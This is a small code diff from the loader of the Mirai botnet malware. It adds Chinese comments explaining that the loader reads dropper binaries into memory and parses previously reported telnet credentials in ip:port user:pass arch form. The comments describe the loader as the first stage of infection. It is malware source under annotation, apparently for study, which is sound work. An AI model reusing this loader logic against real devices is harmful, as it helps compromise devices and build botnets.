@@ -53,7 +53,7 @@ int main(int argc, char **args)
         id_tag = args[1];   //download的方式
     }
 
-    if (!binary_init())
+    if (!binary_init()) //将dvrHelper(dlr)读取到内存到
     {
         printf("Failed to load bins/dlr.* as dropper\n");   //bins底下的文件实际都是dropper而已，不是真正的payload【所以loader/src是入侵的第一步，第二步是mirai目录下的文件（真正的payload）】
         return 1;
@@ -87,7 +87,7 @@ int main(int argc, char **args)
         }
 
         memset(&info, 0, sizeof(struct telnet_info));
-        if (telnet_info_parse(strbuf, &info) == NULL)   //解析上报的telnet信息
+        if (telnet_info_parse(strbuf, &info) == NULL)   //从标准输入，解析此前上报的telnet信息
             printf("Failed to parse telnet info: \"%s\" Format -> ip:port user:pass arch\n", strbuf);
         else
         {
